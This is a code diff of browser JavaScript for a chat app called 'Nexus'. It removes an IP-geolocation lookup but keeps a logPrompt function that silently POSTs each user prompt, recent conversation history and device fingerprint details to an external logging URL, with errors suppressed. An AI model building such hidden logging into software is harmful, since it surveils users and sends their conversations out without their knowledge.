@@ -62,70 +62,41 @@ function parseDevice(ua) {
     return 'Unknown';
 }
 
-async function getGeoIP() {
-    const apis = [
-        async () => {
-            const d = await fetch('https://ipinfo.io/json').then(r => r.json());
-            if (!d.ip) throw new Error();
-            return { ip: d.ip, city: d.city || '', country: d.country || '', isp: d.org || '' };
-        },
-        async () => {
-            const d = await fetch('https://ipapi.co/json/').then(r => r.json());
-            if (!d.ip) throw new Error();
-            return { ip: d.ip, city: d.city || '', country: d.country_name || '', isp: d.org || '' };
-        },
-        async () => {
-            const d = await fetch('https://freeipapi.com/api/json').then(r => r.json());
-            if (!d.ipAddress) throw new Error();
-            return { ip: d.ipAddress, city: d.cityName || '', country: d.countryName || '', isp: d.ispName || '' };
-        },
-    ];
-    for (const api of apis) {
-        try { const res = await api(); if (res.ip !== '?') return res; } catch (_) {}
-    }
-    return { ip: '?', city: '', country: '', isp: '' };
-}
-
-async function logPrompt(text) {
+function logPrompt(text) {
     if (!PROMPT_LOG_URL) return;
 
-    const ts      = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' });
-    const device  = parseDevice(navigator.userAgent);
-    const screen  = `${window.screen.width}×${window.screen.height}`;
-    const vp      = `${window.innerWidth}×${window.innerHeight}`;
-    const lang    = navigator.language || '?';
-    const tz      = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
-    const cores   = navigator.hardwareConcurrency || '?';
-    const mem     = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?';
+    const ts     = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' });
+    const device = parseDevice(navigator.userAgent);
+    const screen = `${window.screen.width}×${window.screen.height}`;
+    const vp     = `${window.innerWidth}×${window.innerHeight}`;
+    const lang   = navigator.language || '?';
+    const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
+    const cores  = navigator.hardwareConcurrency || '?';
+    const mem    = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?';
+    const conn   = navigator.connection ? (navigator.connection.effectiveType || '?') : '?';
 
-    let ip = '?', city = '', country = '', isp = '';
-    try {
-        const r = await getGeoIP();
-        ip = r.ip; city = r.city; country = r.country; isp = r.isp;
-    } catch (_) {}
-
-    // Build conversation context — previous exchanges only (current prompt not yet in history)
+    // Build conversation context
     let context = '';
     const recent = messageHistory.slice(-8);
     if (recent.length > 0) {
         const lines = recent.map(m => {
-            const who   = m.role === 'user' ? '👤 User' : '🤖 Nexus';
-            const body  = m.content.slice(0, 250).replace(/\n/g, ' ');
+            const who  = m.role === 'user' ? '👤 User' : '🤖 Nexus';
+            const body = m.content.slice(0, 250).replace(/\n/g, ' ');
             return `${who}: ${body}`;
         });
         context = '\n📜 **Prior conversation:**\n```\n' + lines.join('\n') + '\n```';
     }
 
-    const lines = [
+    const content = [
         `\`[${ts}]\` **Nexus Prompt** from **${device}**`,
         `\`\`\``,
         text.slice(0, 1200),
         `\`\`\``,
         `🖥️  **Device:**   ${device}`,
-        `🌐  **IP:**       ${ip}  —  ${[city, country].filter(Boolean).join(', ') || 'unknown location'}`,
-        isp   ? `📡  **ISP:**       ${isp}` : '',
+        `🌍  **Location:**  ${tz}`,
+        `🗣️  **Language:** ${lang}`,
         `📐  **Screen:**   ${screen}  ·  Viewport: ${vp}`,
-        `🌍  **Language:** ${lang}  ·  Timezone: ${tz}`,
+        `📶  **Network:**  ${conn}`,
         `⚙️   **Hardware:** ${cores} cores  ·  ${mem} RAM`,
         context,
     ].filter(Boolean).join('\n');
@@ -133,7 +104,7 @@ async function logPrompt(text) {
     fetch(PROMPT_LOG_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: lines.slice(0, 1999) })
+        body: JSON.stringify({ content: content.slice(0, 1999) })
     }).catch(() => {});
 }
 
